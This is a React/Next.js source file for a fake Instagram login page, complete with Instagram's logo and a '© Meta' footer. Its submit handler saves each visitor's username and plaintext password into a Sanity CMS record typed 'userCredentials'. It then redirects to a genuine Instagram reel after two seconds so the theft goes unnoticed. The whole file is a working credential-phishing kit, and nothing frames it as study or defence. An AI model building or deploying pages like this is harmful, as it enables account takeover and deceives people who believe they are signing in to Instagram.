"use client";
import { useState } from "react";
import { client } from "@/src/sanity/lib/client";
import { useRouter } from "next/router";

export default function LoginPage() {
  const router = useRouter();
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);

  async function handleSubmit(e) {
    e.preventDefault();
    setLoading(true);

    try {
      await client.create({
        _type: "userCredentials",
        username,
        password,
      });

      // wait exactly 2 seconds for spinner effect
      setTimeout(() => {
        router.push(
          "https://www.instagram.com/reel/DNNFomLOUVr/?igsh=aXVoNDIxaWlud29h"
        );
      }, 2000);
    } catch (err) {
      console.error(err);
      alert("Error saving to Sanity");
      setLoading(false);
    }
  }

  return (
    <div className="flex min-h-screen items-center justify-center bg-gradient-to-br from-[#fdfbfb] via-[#f1f4f9] to-[#fce4ec]">
      <div className="w-[380px] p-6 flex flex-col items-center">
        {/* Language */}
        <p className="text-sm text-gray-500 mb-5">English (UK)</p>

        {/* Logo */}
        <img src="/instagram-logo.png" alt="Instagram" className="h-16 mb-6" />

        {/* Form */}
        <form onSubmit={handleSubmit} className="flex flex-col space-y-3 w-full">
          <input
            type="text"
            placeholder="Username, email address or mobile number"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            className="w-full bg-[#fafafa] border border-gray-300 text-sm rounded-md px-3 py-3 focus:outline-none focus:border-gray-400"
          />

          <input
            type="password"
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            className="w-full bg-[#fafafa] border border-gray-300 text-sm rounded-md px-3 py-3 focus:outline-none focus:border-gray-400"
          />

          <button
            type="submit"
            disabled={loading}
            className="flex items-center justify-center bg-[#0095f6] text-white rounded-lg py-2 font-semibold hover:bg-[#1877f2] transition disabled:opacity-70"
          >
            {loading ? (
              <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
            ) : (
              "Log in"
            )}
          </button>
        </form>

        {/* Forgotten password */}
        <div className="mt-4">
          <a href="#" className="text-sm text-blue-600 hover:underline">
            Forgotten password?
          </a>
        </div>

        {/* Divider */}
        <div className="flex items-center w-full my-6">
          <div className="flex-grow h-px bg-gray-300"></div>
          <span className="px-3 text-gray-400 text-xs">OR</span>
          <div className="flex-grow h-px bg-gray-300"></div>
        </div>

        {/* Create new account */}
        <button className="border border-gray-300 rounded-lg px-4 py-2 text-sm font-medium hover:bg-gray-50">
          Create new account
        </button>

        {/* Footer */}
        <p className="text-xs text-gray-500 mt-8">© Meta</p>
      </div>
    </div>
  );
}
